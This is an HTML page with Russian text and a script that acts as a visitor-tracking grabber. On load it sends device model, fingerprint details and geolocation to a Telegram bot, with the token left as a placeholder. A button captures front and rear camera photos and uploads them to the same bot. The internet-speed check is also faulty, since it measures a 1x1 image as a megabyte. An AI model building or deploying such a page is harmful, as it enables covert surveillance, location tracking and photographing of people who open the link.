<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Информация об устройстве и определение IP</title>
</head>
<body>
    <h1>Добро пожаловать на страницу определения информации об устройстве и IP</h1>
    <p>Информация о вашем устройстве и IP-адрес будет отправлена в Telegram-бот.</p>

    <button onclick="takePhoto()">Сделать фото</button>

    <script>
        async function getDeviceBrandAndModel() {
            const userAgent = navigator.userAgent;
            let deviceBrand = 'Unknown';
            let deviceModel = 'Unknown';

            if (/android/i.test(userAgent)) {
                deviceBrand = 'Android';
                const match = userAgent.match(/;\s(.*?)(?:\sBuild|\))/);
                if (match) {
                    deviceModel = match[1];
                }
            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                deviceBrand = 'Apple';
                const match = userAgent.match(/\(([a-zA-Z]+);.*?OS\s([0-9_]+)/);
                if (match) {
                    deviceModel = match[1];
                }
            }

            return { brand: deviceBrand, model: deviceModel };
        }

        async function sendDeviceInfoToTelegram() {
            const deviceInfo = await getDeviceBrandAndModel();
            const botToken = 'ВАШ_ТОКЕН_БОТА';
            const chatId = 'ВАШ_CHAT_ID';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `Марка устройства: ${deviceInfo.brand}\nМодель устройства: ${deviceInfo.model}`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Информация об устройстве отправлена в Telegram:', data);
            })
            .catch(error => {
                console.error('Ошибка при отправке информации об устройстве в Telegram:', error);
            });
        }

        sendDeviceInfoToTelegram();

        async function takePhoto() {
            const constraints = {
                video: { facingMode: "user" }
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise((resolve) => (video.onloadedmetadata = resolve));
                video.play();

                const frontPhoto = captureImage(video);
                console.log('Фото с передней камеры сделано');

                constraints.video.facingMode = { exact: "environment" };
                const backStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = backStream;
                await new Promise((resolve) => (video.onloadedmetadata = resolve));
                video.play();

                const backPhoto = captureImage(video);
                console.log('Фото с задней камеры сделано');

                sendPhotoToTelegram(frontPhoto, 'Передняя камера');
                sendPhotoToTelegram(backPhoto, 'Задняя камера');

            } catch (error) {
                console.error('Ошибка при доступе к камере:', error);
            }
        }

        function captureImage(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png');
        }

        function sendPhotoToTelegram(photoData, camera) {
            const botToken = 'ВАШ_ТОКЕН_БОТА';
            const chatId = 'ВАШ_CHAT_ID';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', dataURItoBlob(photoData));
            formData.append('caption', `Фото с ${camera}`);

            fetch(telegramApiUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log(`Фото с ${camera} отправлено в Telegram:`, data);
            })
            .catch(error => {
                console.error(`Ошибка при отправке фото с ${camera} в Telegram:`, error);
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        console.log(`Широта: ${latitude}, Долгота: ${longitude}`);
                        sendLocationToTelegram(latitude, longitude);
                    },
                    (error) => {
                        console.error('Ошибка при получении геолокации:', error);
                    }
                );
            } else {
                console.error('Геолокация не поддерживается этим браузером.');
            }
        }

        function sendLocationToTelegram(latitude, longitude) {
            const botToken = 'ВАШ_ТОКЕН_БОТА';
            const chatId = 'ВАШ_CHAT_ID';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `Геолокация пользователя: ${latitude},${longitude}`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Геолокация отправлена в Telegram:', data);
            })
            .catch(error => {
                console.error('Ошибка при отправке геолокации в Telegram:', error);
            });
        }

        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const deviceInfo = {
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                uptime: Math.round(performance.now() / 1000),
                webglSupport: supportsWebGL(),
                fonts: await getFonts(),
                renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
            };

            if (/android/i.test(userAgent)) {
                deviceInfo.device = 'Android';
            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                deviceInfo.device = 'iOS';
            } else {
                deviceInfo.device = 'Unknown';
            }

            if (/chrome|crios|crmo/i.test(userAgent)) {
                deviceInfo.browser = 'Chrome';
            } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
                deviceInfo.browser = 'Firefox';
            } else if (/safari/i.test(userAgent)) {
                deviceInfo.browser = 'Safari';
            } else if (/msie|trident/i.test(userAgent)) {
                deviceInfo.browser = 'Internet Explorer';
            } else {
                deviceInfo.browser = 'Unknown';
            }

            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.batteryLevel = battery.level * 100 + '%';
            } else {
                deviceInfo.batteryLevel = 'Not supported';
            }

            return deviceInfo;
        }

        function supportsWebGL() {
            try {
                const canvas = document.createElement('canvas');
                return !!window.WebGLRenderingContext && !!canvas.getContext('webgl');
            } catch (e) {
                return false;
            }
        }

        async function getFonts() {
            const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Courier', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
            const availableFonts = [];
            for (const font of fontList) {
                if (document.fonts.check(`12px "${font}"`)) {
                    availableFonts.push(font);
                }
            }
            return availableFonts.join(', ');
        }

        function checkInternetSpeed() {
            const image = new Image();
            const startTime = new Date().getTime();
            let speed = 0;
            image.onload = function() {
                const endTime = new Date().getTime();
                const duration = (endTime - startTime) / 1000;
                const bitsLoaded = 1024 * 1024 * 8;
                speed = (bitsLoaded / duration / (1024 * 1024)).toFixed(2);
                console.log(`Скорость интернета: ${speed} Мбит/с`);
                sendSpeedToTelegram(speed);
            };

            image.onerror = function() {
                console.error('Ошибка при проверке скорости интернета.');
            };

            image.src = `https://upload.wikimedia.org/wikipedia/commons/2/2c/1x1.png?${new Date().getTime()}`;
        }

        function sendSpeedToTelegram(speed) {
            const botToken = 'ВАШ_ТОКЕН_БОТА';
            const chatId = 'ВАШ_CHAT_ID';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `Скорость интернета: ${speed} Мбит/с`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Скорость интернета отправлена в Telegram:', data);
            })
            .catch(error => {
                console.error('Ошибка при отправке скорости интернета в Telegram:', error);
            });
        }

        // Запуск всех функций
        (async () => {
            const deviceInfo = await getDeviceInfo();
            console.log('Информация об устройстве:', deviceInfo);
            checkInternetSpeed();
            getGeolocation();
        })();
    </script>
</body>
</html>
